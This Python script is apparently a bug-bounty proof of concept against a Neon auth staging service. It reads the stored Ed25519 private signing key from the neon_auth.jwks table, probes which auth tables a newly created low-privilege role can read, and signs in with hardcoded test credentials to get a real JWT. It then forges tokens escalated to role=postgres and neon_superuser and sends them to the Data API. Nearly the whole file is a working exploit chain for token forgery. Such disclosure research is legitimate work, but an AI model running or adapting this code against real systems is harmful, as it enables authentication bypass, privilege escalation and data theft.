# -*- coding: utf-8 -*-
"""V26: jwks private key chain.
A. create low-priv role -> can it SELECT neon_auth.jwks/user/session/organization/member?
B. sign JWT with stored Ed25519 private key (payload clone + role=postgres) -> Data API?
   - proves: any role with DB read on neon_auth.jwks can forge any Data API identity"""
import json, ssl, time, http.client, base64

NA = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
AP = "ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def req(host, method, path, body=None, hdr=None, timeout=20):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=timeout)
        h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json",
             "Content-Type": "application/json"}
        if hdr:
            h.update(hdr)
        conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read().decode("utf-8", "replace")
        hd = dict((k.lower(), v) for k, v in r.getheaders())
        conn.close()
        return r.status, raw, hd
    except Exception as e:
        return -1, "EXC %s" % str(e)[:120], {}


def b64u(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.b64encode(s).decode().replace("+", "-").replace("/", "_").rstrip("=")


def dec(s):
    s2 = s.replace("-", "+").replace("_", "/")
    s2 += "=" * (-len(s2) % 4)
    return base64.b64decode(s2).decode("utf-8", "replace")


def get_uri(role="neondb_owner", db="neondb"):
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=%s&role_name=%s&branch_id=br-wandering-field-w2ob6mpn" % (db, role),
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    return urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))


def main():
    import psycopg
    out("== V26 jwks private key chain ==")
    uri = get_uri()
    # 1. read full jwks row
    with psycopg.connect(uri, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute('SELECT "publicKey", "privateKey" FROM neon_auth.jwks')
            pub, priv = cur.fetchall()[0]
            priv_raw = json.loads(priv)
            pub_raw = json.loads(pub)
    out("priv key len: %d chars (hex)" % len(priv_raw))
    # 2. create low-priv role
    rnd = str(int(time.time()))[-5:]
    rname = "sec_v26" + rnd
    with psycopg.connect(uri, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute('CREATE ROLE %s LOGIN PASSWORD %s' % (rname, "'SecTest!v26pass'"))
            cur.execute('GRANT CONNECT ON DATABASE neondb TO %s' % rname)
            cur.execute('GRANT USAGE ON SCHEMA neon_auth TO %s' % rname)
    out("role %s created" % rname)
    # 3. low-priv role SELECT matrix (no explicit grants on tables -> expect deny)
    luri = get_uri(role=rname)
    import re
    luri = re.sub(r"password=[^&]*", "password=SecTest!v26pass", luri)
    try:
        with psycopg.connect(luri, connect_timeout=15) as dbc:
            dbc.autocommit = True
            with dbc.cursor() as cur:
                for t in ("jwks", "user", "session", "organization", "member", "project_config", "verification", "account"):
                    try:
                        cur.execute('SELECT count(*) FROM neon_auth.%s' % t)
                        out("low-role SELECT neon_auth.%-16s -> OK %s" % (t, cur.fetchone()))
                    except Exception as e:
                        out("low-role SELECT neon_auth.%-16s -> DENY %s" % (t, str(e).split("\\n")[0][:90]))
                try:
                    cur.execute("SELECT count(*) FROM information_schema.tables")
                    out("low-role information_schema -> OK")
                except Exception as e:
                    out("low-role information_schema -> DENY %s" % str(e)[:80])
    except Exception as e:
        out("low-role connect failed: %s" % str(e)[:200])
    # 4. get real JWT from /token
    st, raw, hd = req(NA, "POST", "/neondb/auth/sign-in/email",
                      {"email": "libobo1229+na_org1@gmail.com", "password": "SecTest!2026pass"},
                      {"Origin": "http://localhost:3000"})
    ck = ""
    for part in (hd.get("set-cookie") or "").split(","):
        kv = part.strip().split(";")[0]
        if "=" in kv and kv.strip().split("=")[0] in ("__Secure-neon-auth.session_token", "better-auth.session_token"):
            ck = kv.strip()
    if not ck:
        d = json.loads(raw)
        ck = "__Secure-neon-auth.session_token=" + d.get("token", "")
    st, raw2, _ = req(NA, "GET", "/neondb/auth/token", hdr={"Cookie": ck})
    out("/token -> %d" % st)
    jwt = json.loads(raw2).get("token", "")
    h0 = json.loads(dec(jwt.split(".")[0]))
    p0 = json.loads(dec(jwt.split(".")[1]))
    out("real JWT header: %s" % json.dumps(h0))
    out("real JWT payload: %s" % json.dumps(p0))
    # 5. sign with stored private key
    try:
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from cryptography.hazmat.primitives import serialization
    except Exception as e:
        out("cryptography missing: %s" % str(e))
        return
    seed = bytes.fromhex(priv_raw[:64])
    sk = Ed25519PrivateKey.from_private_bytes(seed)
    pk_from_seed = sk.public_key().public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw)
    out("pubkey match: %s" % (b64u(pk_from_seed) == pub_raw.get("x")))
    # sign payload clone (same claims) + role=postgres variant
    for tag, payload in [("clone", p0),
                         ("role=postgres", dict(p0, role="postgres")),
                         ("role=neon_superuser", dict(p0, role="neon_superuser"))]:
        ph = b64u(json.dumps(h0, separators=(",", ":")))
        pp = b64u(json.dumps(payload, separators=(",", ":")))
        sig = sk.sign((ph + "." + pp).encode())
        tj = ph + "." + pp + "." + b64u(sig)
        st, raw3, _ = req(AP, "GET", "/neondb/rest/v1/", hdr={"Authorization": "Bearer " + tj})
        out("forged %-18s -> %d %s" % (tag, st, raw3[:110].replace("\n", " ")))
        time.sleep(0.3)
    # cleanup role
    with psycopg.connect(uri, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute('DROP ROLE IF EXISTS %s' % rname)
    out("role dropped")
    out("done")


if __name__ == "__main__":
    main()
